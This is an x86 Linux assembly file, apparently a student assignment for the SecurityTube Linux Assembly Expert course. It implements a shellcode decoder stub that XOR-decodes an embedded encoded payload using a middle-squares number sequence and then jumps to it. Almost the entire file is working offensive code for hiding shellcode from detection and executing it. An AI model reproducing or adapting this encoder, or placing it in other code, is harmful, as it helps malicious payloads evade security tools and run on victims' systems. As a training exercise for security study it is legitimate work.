; x86 middle squares decoder stub sample
; Author: @0x0fbc
; This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
; http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
; Student ID: SLAE - 1187

global _start

section .text

_start:
    jmp short call_decoder

setup:
    xor ecx, ecx            ; empty ecx
    pop esi                 ; pop the address of encoded shellcode to ESI
    mov edi, esi            ; save this address in EDI
    mov eax, 0x7d6d4489     ; write initial seed into eax
    mov cl, 0x07            ; move the length of the shellcode in bytes rounded up to the nearest byte into cl

decode_loop:
    mul eax                 ; square the seed
    mov ax, dx              ; We want the middle bytes between EAX and EDX combined. To get this simply we move the low bytes we want from EDX into the low bytes we will discard from EAX.
    ror eax, 0x10           ; then we rotate EAX 16 bits to get the bits into position. The output of this is not only what to decode our encoded shellcode but also the next round's seed.
    mov ebx, eax            ; copy the result into ebx to operate on, we need to hold onto the value returned by MUL in eax as it is the new seed for the next round of stretching.
    bswap ebx               ; when we dereference edi to get encoded bytes, they'll come back in little-endian format, to cut down on size we switch the endianness of ebx
    xor ebx, dword [edi]    ; decode four bytes of encoded shellcode
    mov [edi], ebx          ; write the encoded shellcode back to memory
    add edi, 0x04           ; increment edi so it points to the next four bytes of encoded shellcode
    loop decode_loop        ; if we haven't iterated over the entire shellcode, move to the next round of decoding.
    jmp esi                 ; otherwise JMP to what should be decoded shellcode.


call_decoder:
        call setup
        shellcode: db 0xd2,0x43,0x08,0xc3,0x8f,0x14,0xdb,0x37,0x89,0x06,0xa7,0xd2,0xfc,0x58,0xe4,0xee,0xd3,0x3f,0xe3,0xa3,0x65,0x15,0xe6,0xc3,0x39,0xf0,0x18
